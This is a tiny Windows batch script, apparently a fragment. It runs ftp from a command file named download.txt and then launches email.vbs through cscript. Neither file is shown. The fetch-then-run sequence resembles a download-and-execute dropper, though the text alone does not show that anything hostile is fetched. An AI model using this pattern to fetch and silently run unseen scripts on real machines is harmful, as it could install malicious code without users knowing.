ftp -s:download.txt
@echo off
pushd %~dp0
start "" cmd /c cscript email.vbs
quit
